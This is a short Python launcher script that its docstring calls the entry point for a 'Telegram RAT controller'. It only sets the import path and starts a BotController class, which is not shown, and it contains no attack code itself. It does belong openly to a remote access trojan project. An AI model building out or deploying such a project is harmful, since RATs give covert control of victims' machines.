#!/usr/bin/env python3
"""CLI entry point for the Telegram RAT controller.

This small launcher imports and starts the `BotController`. The
insertion into `sys.path` ensures that running `python main.py` from
the project root will import local packages correctly.
"""

import sys
import os

# Ensure repository root is on sys.path for local imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from bot.bot_controller import BotController


def main():
    """Create and start the bot controller.

    The controller runs background threads and will block until
    interrupted (Ctrl+C) or an unrecoverable error occurs.
    """
    try:
        controller = BotController()
        controller.start()
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()